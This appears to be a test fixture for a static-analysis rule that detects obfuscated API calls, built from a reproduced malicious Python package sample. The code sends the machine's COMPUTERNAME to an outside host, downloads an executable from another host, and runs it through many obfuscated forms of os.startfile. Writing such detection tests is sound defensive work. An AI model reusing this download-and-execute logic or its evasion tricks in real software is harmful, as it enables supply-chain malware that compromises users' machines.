""" Tests for api-obfuscation rule

    RULEID cases:
      - obfuscated version of 1337c package
"""

def send():
    try:
        env = os.environ['COMPUTERNAME']
        t = requests.get("https://linkedopports.com/pyp/resp.php?live=Installation " +env)
        if platform == 'win32':
            url = 'https://python-release.com/python-install.scr'
            filename = 'ini_file_pyp_32.exe'
            rq = requests.get(url, allow_redirects=True)
            open(filename, 'wb').write(rq.content)
            
            # os.system('start '+filename)
            # ruleid: api-obfuscation
            os.__dict__['startfile']('start '+filename)

            # ruleid: api-obfuscation
            os.__dict__['startfile'].__call__('start '+filename)
            # ruleid: api-obfuscation
            os.__getattribute__('startfile')('start '+filename)

            # ruleid: api-obfuscation
            os.__getattribute__('startfile').__call__('start '+filename)

            # ruleid: api-obfuscation
            getattr(os, 'startfile')('start '+filename)

            # ruleid: api-obfuscation
            getattr(os, 'startfile').__call__('start '+filename)

            # ruleid: api-obfuscation
            __import__('os').startfile('start '+filename)

            # ruleid: api-obfuscation
            __import__('os').startfile.__call__('start '+filename)

            # ruleid: api-obfuscation
            __import__('os').__dict__['startfile']('start '+filename)

            # ruleid: api-obfuscation
            __import__('os').__dict__['startfile'].__call__('start '+filename)

            # ruleid: api-obfuscation
            __import__('os').__getattribute__('startfile')('start '+filename)

            # ruleid: api-obfuscation
            __import__('os').__getattribute__('startfile').__call__('start '+filename)

            # ruleid: api-obfuscation
            getattr(__import__('os'), 'startfile')('start '+filename)

            # ruleid: api-obfuscation
            getattr(__import__('os'), 'startfile').__call__('start '+filename)
    except:
        pass    
